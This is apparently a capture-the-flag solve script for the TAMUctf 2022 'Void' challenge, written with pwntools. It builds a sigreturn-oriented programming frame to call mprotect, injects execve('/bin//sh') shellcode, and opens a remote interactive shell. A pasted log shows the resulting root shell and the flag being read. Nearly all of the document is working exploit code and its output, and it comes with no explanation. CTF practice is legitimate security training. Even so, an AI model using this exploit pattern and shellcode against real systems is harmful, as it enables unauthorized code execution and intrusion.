from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './void'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = remote("tamuctf.com", 443, ssl=True, sni="void")
else:
  s = process(BINARY)

syscall_ret = 0x401018 # syscall; ret;

buf  = p64(elf.sym._start)
buf += p64(0)*13
buf += p64(0x402000)    # RDI
buf += p64(0x1000)      # RSI
buf += b"C"*8           # RBP
buf += b"D"*8           # PBX
buf += p64(7)           # RDX
buf += p64(10)          # RAX
buf += b"G"*8           # RCX
buf += p64(0x402160)    # RSP
buf += p64(syscall_ret) # RIP
buf += p64(0)
buf += p64(0x33)
buf += p64(0)*5
s.sendline(buf)

# call sys_rt_sigreturn
sleep(0.2)
buf  = p64(syscall_ret)  
buf += b"A"*(15-len(buf)-1)
s.sendline(buf)

shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

sleep(0.2)
s.sendline(p64(0x402168)+shellcode)

s.interactive()

'''
mito@ubuntu:~/CTF/TAMUctf_2022/Pwn_Void$ python3 solve.py r
[*] '/home/mito/CTF/TAMUctf_2022/Pwn_Void/void'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to tamuctf.com on port 443: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ ls -l
total 20
-rw-r--r-- 1 root root   67 Apr 15 01:37 docker_entrypoint.sh
-rw-r--r-- 1 root root   38 Apr 14 12:33 flag.txt
-rwxr-xr-x 1 root root 9376 Apr 15 01:37 void
$ cat flag.txt
gigem{1_6u355_7h475_h0w_w3_3xpl017_17}
'''
